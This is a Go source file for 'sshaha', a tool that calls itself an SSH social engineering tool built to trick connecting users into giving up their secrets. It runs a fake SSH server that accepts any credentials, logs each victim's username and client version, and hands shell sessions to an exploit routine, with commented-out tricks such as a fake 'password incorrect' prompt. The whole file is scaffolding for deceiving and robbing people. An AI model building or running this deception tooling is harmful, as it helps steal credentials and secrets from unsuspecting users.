package cmd

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"log"
	"net"
	"os"
	"reflect"
	"strconv"

	"github.com/kr/pty"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/ssh"
)

var (
	sessionID = 0
)

func init() {
	// rootCmd.PersistentFlags().StringP("victimOS", "v", "ubuntu", "The operating system of the connecting victim")
	// viper.BindPFlag("victimOS", rootCmd.PersistentFlags().Lookup("victimOS"))

	// rootCmd.PersistentFlags().StringP("serverOS", "s", "ubuntu", "What operating system this sshaha will pretend to be")
	// viper.BindPFlag("serverOS", rootCmd.PersistentFlags().Lookup("serverOS"))

	// rootCmd.PersistentFlags().StringP("victimHostname", "o", "localhost", "The hostname of the victims machine")
	// viper.BindPFlag("victimHostname", rootCmd.PersistentFlags().Lookup("victimHostname"))

	// rootCmd.PersistentFlags().StringArrayP("tricks", "t", []string{"all"}, "The tricks that the server will run on the victim")
	// viper.BindPFlag("tricks", rootCmd.PersistentFlags().Lookup("tricks"))

}

// Execute run things
func Execute() {
	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

var rootCmd = &cobra.Command{
	Use:   "sshaha <ip> <port>",
	Short: "ssh social engineering tool",
	Long:  `sshaha is designed to trick unwary users that connect to it into giving up their secrets`,
	Args:  cobra.ExactArgs(2),
	Run: func(cmd *cobra.Command, args []string) {
		ip := args[0]
		port := args[1]
		config := &ssh.ServerConfig{
			NoClientAuth: true,
			// Remove to disable password auth.
			PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
				return nil, nil
			},
			//		Remove to disable public key auth.
			PublicKeyCallback: func(c ssh.ConnMetadata, pubKey ssh.PublicKey) (*ssh.Permissions, error) {
				return nil, nil
			},
		}
		_, priv, err := generateSSHKeys()
		if err != nil {
			log.Fatal("couldn't generate keys")
		}
		private, err := ssh.ParsePrivateKey(priv)
		if err != nil {
			log.Fatal("Failed to parse private key: ", err)
		}
		config.AddHostKey(private)
		// Once a ServerConfig has been configured, connections can be
		// accepted.
		listener, err := net.Listen("tcp", fmt.Sprintf("%s:%s", ip, port))
		if err != nil {
			log.Fatal("failed to listen for connection: ", err)
		}
		log.Println("SSHaha started, now listening for connections")
		listenForConnections(listener, config)
	},
}

func listenForConnections(listener net.Listener, config *ssh.ServerConfig) {
	for {
		nConn, err := listener.Accept()
		if err != nil {
			log.Println("failed to accept incoming connection: ", err)
			continue
		}
		go assignSSHServer(nConn, config)
	}
}

// GetOutboundIP Get preferred outbound ip of this machine
func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "localhost"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func assignSSHServer(nConn net.Conn, config *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		log.Println("failed to handshake: ", err)
		return
	}
	username := getUsername(&conn.Conn)
	sshVersion := getClientSSHVersion(&conn.Conn)
	connectionDetails := map[string]string{
		"username":   username,
		"sshVersion": sshVersion,
		"hostIP":     GetOutboundIP(),
	}
	// The incoming Request channel must be serviced.
	go ssh.DiscardRequests(reqs)
	// Service the incoming Channel channel.
	handleChannels(chans, connectionDetails)
}

// generateSSHKeys returns two byte slices filled with new, pem block encoded private and public keys
func generateSSHKeys() (pub []byte, priv []byte, err error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	privKeyBuf := &bytes.Buffer{}
	privateKeyPEM := &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)}
	if err = pem.Encode(privKeyBuf, privateKeyPEM); err != nil {
		return nil, nil, err
	}
	priv = privKeyBuf.Bytes()
	// generate and write public key
	pkix, err := x509.MarshalPKIXPublicKey(&privateKey.PublicKey)
	if err != nil {
		return nil, nil, err
	}
	publicKeyPEM := &pem.Block{Type: "RSA PUBLIC KEY", Bytes: pkix}
	pubKeyBuf := &bytes.Buffer{}
	if err = pem.Encode(pubKeyBuf, publicKeyPEM); err != nil {
		return nil, nil, err
	}
	pub = pubKeyBuf.Bytes()
	if err != nil {
	}
	return pub, priv, nil
}

func handleExec() bool {
	return true
}

func handlePty() bool {
	return true
}

func handleEnv(req *ssh.Request) bool {
	return true
}

func handleShell(channel ssh.Channel, connDetails map[string]string) bool {
	sessionID = sessionID + 1
	connDetails["sessionID"] = strconv.Itoa(sessionID)

	log.Printf("shell session %s started ", connDetails["sessionID"])
	exploit(channel, connDetails)
	// corruptedLoginTrick(channel, connDetails)
	// passwordIncorrectTrick(channel, connDetails)
	return true
}

func handleRequest(in <-chan *ssh.Request, channel ssh.Channel, tty *os.File, f *os.File, connDetails map[string]string) error {
	for req := range in {
		ok := false
		switch req.Type {
		case "exec":
			ok = handleExec()
		case "shell":
			ok = handleShell(channel, connDetails)
		case "pty-req":
			ok = handlePty()
		case "window-change":
			continue // no response
		case "env":
			ok = handleEnv(req)
		}
		if !ok {
			return fmt.Errorf("declining %s request", req.Type)
		}
		req.Reply(ok, nil)
	}
	return nil
}

func handleChannels(chans <-chan ssh.NewChannel, connDetails map[string]string) {
	// Service the incoming Channel channel.
	for newChannel := range chans {
		if t := newChannel.ChannelType(); t != "session" {
			newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
			continue
		}
		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("could not accept channel (%s)", err)
			continue
		}
		f, tty, err := pty.Open()
		if err != nil {
			log.Printf("could not start pty (%s)", err)
			continue
		}
		go handleRequest(requests, channel, tty, f, connDetails)
	}
}

func getUsername(f *ssh.Conn) string {
	v := reflect.ValueOf(*f)
	y := v.Elem().FieldByName("sshConn")
	return y.FieldByName("user").String()
}

func getClientSSHVersion(f *ssh.Conn) string {
	v := reflect.ValueOf(*f)
	y := v.Elem().FieldByName("sshConn")
	clientVersion := y.FieldByName("clientVersion").Bytes()
	return string(clientVersion)
}
